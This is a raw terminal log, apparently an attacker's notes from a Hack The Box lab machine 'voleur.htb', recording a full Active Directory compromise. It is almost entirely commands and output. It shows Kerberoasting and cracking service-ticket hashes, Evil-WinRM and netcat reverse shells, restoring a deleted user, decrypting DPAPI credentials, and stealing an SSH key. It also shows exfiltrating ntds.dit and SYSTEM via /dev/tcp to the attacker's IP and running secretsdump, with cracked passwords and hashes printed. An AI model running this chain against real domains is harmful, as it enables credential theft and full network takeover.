+$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$276e0bd14c363c5d2f1cb9892a21f6e6$8e0af888860874f8ec4fe3417261b5a2e93572ebcc403910d2890ff5cd7e45e35a9f532f06540c0aea49d91ac2d620992d1c8084b8e32d4b79b8bcf0c622f9c345397e6fb77d636ec36a55f14f3942487d6c513cc491ed50d135dcc01702814fdfb9d3976d5318130c6aa9a81bb485549c00ab32235baa9336071d62a8a63a039e002aab4840ec0ba485fa769b194fafbbef91f18e3c106df14d892a3a87cb7bbc8416ec74eb3b8c5ed91c33d77a51b14860ce8b245e61a23c6b6fb123e2c69895b1c4d8628fc75c1a2f5c5a5483eee282f9f2518d019e246813495c093247d6c18c2a4c49c4e0930139dcbf7db48827665fd223d953493caeaffd5959b5bf2bfe5e70e4008184c25004f40fc4125f83e15b0247f8abc15f22b487025b4ec844a6ffce9726501b3af8750cfa71b0124f7fdd06dd5f62e6161841126e638a2a4addea0699154303132673113cb5335cd7361e22691789d0b93ffe1bc29b2efb56b9b546f05af975ec1f9a8561157c90d4198c0e1f9f932baa068050c8eae7b49c8546d0fc925e661595f8c48457be5b3255de3caf0cb6687a7437bfc480fad808c13f9d9e9e7ff1789af26636a4aded701bee9a40e0dd95f4f3bacd608a2c0ea7e66d62ece8f5012f06dee0f114ad565c49620d75d83ba3b6b1a7221974c5c6af2d0afd42ff65862b782e660876067f6a9b14218b02b718b3d2481953e510e30dcc39564c55eb9c75a90e7925c14b0cfbd39ca4cf8bcbe0157aaa6b35593ccad36ba68efbb1e8508e715824a9a594c3e21e0ae4d144d8a287b17f8797c8df842f1a13ae3f68abc060c48c3071d73efb45705690c462e9253bc03d6c8431bdf22df89e31eec978582614d6fd2bd09a4afe3e3641f08f00ea8dc72f492b2522d09c920958740a2d4e69d16f631e5d8d3d143a784acca570a9e4df34b829ba9ab19626b5ee0fa21930a96b080e93a1d83530a44484dc11e41ca8699e4ec3ed34351c470fc41f47a4e78018d0e32cd62c5f9c10209a28846a0569b7a45c1c0fba1f81de4f793491aa06f17f1faa237ae2416f6166be89a45753da2f5c30596cbde220bd507bb4d3b127d2f494a5ff24227e04acc6d68d812dec6be3de9a1b2b79a31ef079634535991e46964d8f6703ee5559a6180c112eef044a41f5e5cbdea9a5cc610da1d0b1c7b6091ea5911452a3ee94bf7ff9dace6d75a48e139c46c75f5c38eb76fd534c8d9d4cfde28d50d3bf7674a118cc32c6052146451f5dbcaa50758fbc4b7cc1c3263890c0e4087bc8f6012e92bb6f963137be935d3f969ddd101da26a21ae53867d0bbbe2fd6bdecd04c313c60a1da7055e9f87cfaed0d1cdd55e54c668c7dc0f1262736fbabc519f7f7146d1feeeeb1acd92eebc4656cd655bb864ada0007d2a9271dcb68065aa32d045768781be519568605d2d4c75e479fa82a9da35d7ae3e25d003ba913e5187cda70434e11f
+[VERBOSE] SPN removed successfully for (lacey.miller)
+[VERBOSE] SPN added successfully for (svc_winrm)
+[+] Printing hash for (svc_winrm)
+$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$e70d824bafa7ba157962fdbde9d3b83f$eee6d8defb202f4fe5946c66f707e430f00dc9b710af8f7d141f08038abd78bc072eb5bd744b12bf8869381a4d7f28170c463b785474d7fa5eadeea9760396a75c7136ba71431c816a822ee786fe74a68e18b414f2487cf6e1d8fe69eee0f6b16dcf0d824ef2f354a671f089e2a0c242c9ababcd591075ca9d104df77d5282fd3fa96a8d585e60e1c98de459dd0112bc3d5f076411c615b34f97174254ae295006fe39cae1565bca94c16280de33ddaf408634f137091c16195d22cb086e731056dec3c866fee4af90152fbb22b573bb6943e6a866e52ffd76d9609b1d93b4ac47c6290b13a783458639b927b7acbb3c68ca1d026a7d4192359df5a1a0459bc541908163dab61bf6ea1d15eb204a879755949bf6985656c82ef8dc10ee7bce8c10b726212196cea6b163b748c7f27d0f44a40f27a1e05c5b9608015edd743b86bc21681d953c822161330a2e1df5df4085a039f14f6620aa88656343ee41ea282a3edec2a5aec7b628e483a7652753bc6f75907ccba3da4fcc60f9a9ffb91096dba2d57b46c1fa40f6e62c9e64b41f9276b0969dd5fdcf77eb1fddc2a052abd7d1a743d90799aa1091f489b0d2f191e47913c7563d88b63758658b08d0df71716e6c8f27ffdb91f9221286049489ea732be7ccbe0eaa345c428a9c75e40fa4d7b17d42ff97ba207997f857221237616eb0c5bf465b136e2555f136c80d9a31801afd0518f9265de60c4ff8737afa66ad1182272189dc6219fcef38ae476d14b13aa1c80e81e78147e47c98a7fa8992c3e2b7aeae93e3140932101bc1a8ddca47ac564eb57623cc92399f5f4751c2350b0030a119e9c188a5e7e25ebfd4b01dd569709c973199d83e6ab51285f5d66a61962f96facce3f17a4d968f4f82078e3b618abab26352c70ea7089248603da20c6cc9f62cb51f70ab32f70096f89589c176de6c26997036252193fee0b4d77e2502746e85cebb280f838bbaf2ec34e3fa1ed52e8869751174e5c81fe8827f706eff90ac1676dd799e296fb43aaebf30e857fd030464fbc48ac703a401631bdbdb17faceb25865fd80fbde013b871556915cbb3f882edf80c4da16600739581fc902e119322ebc25dc338fe92dbddf798896e0eba92eff72b09b9ebf1df9ce3c82a7eb3b11f528afe94c05870c2cab9562209fc219469e6fdb2f24e94f19dd83bb44550cc43084f77f3f81e4a4c3c5055d2b88f198481efb43edf456708dfac3740f64b581cc6aa5ee295aaa9016e5d54fed18b844b3eb63e5d41ae255d79479c8afe6cc53be5e236a4a59f2ec58607c73b41b942f0c4a7fe18cd58d84924c4df4b823341f155f6f163a88174f7f6fc105bfc57994e0f3bdbfd9def90c3257e5c9105b3daed1dff9c0b0c32aed7c8f4c10772af6ef3180d19a8b6ceea2c533266dc5cddd085a17e386621a0773c7cdcf8d1147f046f29bbb0c764f1a47c246b6473512d9
+[VERBOSE] SPN removed successfully for (svc_winrm)
+
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ john hash_svcwin --wordlist=~/tools/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+AFireInsidedeOzarctica980219afi (?)     
+1g 0:00:00:05 DONE (2025-08-22 00:34) 0.1757g/s 2016Kp/s 2016Kc/s 2016KC/s AG156228..AEGIES
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+└─$ evil-winrm -i voleur.htb -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type ArgumentError happened, message is unknown type: 2061232681
+//still cannot use password, tried to get tgt 
+
+└─$ impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_winrm.ccache
+
+
+//
+
+└─$ evil-winrm -i DC.VOLEUR.HTB -k svc_winrm.ccache -r VOLEUR.HTB
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: Useless cert/s provided, SSL is not enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ../desktop
+*Evil-WinRM* PS C:\Users\svc_winrm\desktop> dir
+
+
+    Directory: C:\Users\svc_winrm\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
+-ar---         8/21/2025   4:17 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc_winrm\desktop> type user.txt
+0956bcdf7c29019070b3758da1745be8
+
+└─$ nc -nvlp 8821           
+listening on [any] 8821 ...
+connect to [10.10.16.33] from (UNKNOWN) [10.10.11.76] 53907
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
+Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
+
+
+Deleted           : True
+DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+Name              : Todd Wolfe
+                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+ObjectClass       : user
+ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
+
+PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd wolfe*"' -IncludeDeletedObjects | restore-ADObject
+Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd wolfe*"' -IncludeDeletedObjects | restore-ADObject
+PS C:\Windows\system32> net user /domain
+net user /domain
+
+User accounts for \\DC
+
+-------------------------------------------------------------------------------
+Administrator            krbtgt                   svc_ldap                 
+todd.wolfe               
+The command completed successfully.
+
+
+
+─$ export KRB5CCNAME=todd.wolfe.ccache                            
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ impacket-smbclient -k dc.voleur.htb                         
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# ls
+[-] No share selected
+# shares
+ADMIN$
+C$
+Finance
+HR
+IPC$
+IT
+NETLOGON
+SYSVOL
+# use Finance
+[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+# use IT
+# ls
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 .
+drw-rw-rw-          0  Fri Jul 25 06:09:59 2025 ..
+drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 Second-Line Support
+# cd Second-Line Support
+# ls
+drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 .
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 ..
+drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 Archived Users
+# cd Archived Users
+# ls
+drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 .
+drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 ..
+drw-rw-rw-          0  Thu Jan 30 02:13:16 2025 todd.wolfe
+# cd todd.wolfe
+
+ get DFBE70A7E5CC19A398EBF1B96859CE5D
+
+
+# get 08949382-134f-4c63-b93c-ce52efc0aa88
+# pwd
+/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
+
+PS C:\Windows\system32> wmic useraccount get name,sid
+wmic useraccount get name,sid
+Name           SID                                             
+Administrator  S-1-5-21-3927696377-1337352550-2781715495-500   
+krbtgt         S-1-5-21-3927696377-1337352550-2781715495-502   
+svc_ldap       S-1-5-21-3927696377-1337352550-2781715495-1106  
+todd.wolfe     S-1-5-21-3927696377-1337352550-2781715495-1110  
+
+└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2025-01-29 12:55:19
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=Jezzas_Account
+Description : 
+Unknown     : 
+Username    : jeremy.combs
+Unknown     : qT3V9pLXyN7W4m
+
+//get a new user crendential
+
+└─$ impacket-getTGT voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m' 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in jeremy.combs.ccache
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ export KRB5CCNAME=jeremy.combs.ccache                          
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ impacket-smbclient -k dc.voleur.htb                        
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+Finance
+HR
+IPC$
+IT
+NETLOGON
+SYSVOL
+# use IT
+# ls
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 .
+drw-rw-rw-          0  Fri Jul 25 06:09:59 2025 ..
+drw-rw-rw-          0  Fri Jan 31 03:11:29 2025 Third-Line Support
+# cd Third-Line Support
+# ls
+drw-rw-rw-          0  Fri Jan 31 03:11:29 2025 .
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 ..
+-rw-rw-rw-       2602  Fri Jan 31 03:11:29 2025 id_rsa
+-rw-rw-rw-        186  Fri Jan 31 03:07:35 2025 Note.txt.txt
+# get Note.txt.txt
+# get id_rsa
+# exit
+
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ cat Note.txt.txt      
+Jeremy,
+
+I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.
+
+Please see what you can set up.
+
+Thanks,
+
+Admin                                                                                                                 
+
+//so guess the privi key is belonged to svc_backup(noticed in bloodhound)
+└─$ chmod 600 id_rsa   
+└─$ ssh svc_backup@voleur.htb -i id_rsa -p 2222
+
+
+cd mnt/c/IT/Third-Line Support/backups/Active Directory
+
+//sent to kali
+└─$ nc -nvlp 8822 > SYSTEM  
+listening on [any] 8822 ...
+connect to [10.10.16.33] from (UNKNOWN) [10.10.11.76] 54348
+
+cat ntds.jfm > /dev/tcp/10.10.16.33/8822
+cat ntds.dit > /dev/tcp/10.10.16.33/8822
+cat SYSTEM > /dev/tcp/10.10.16.33/8822
+
+  └─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+//use secretdump to find all credential in the db.
+  
+  
+
+
+
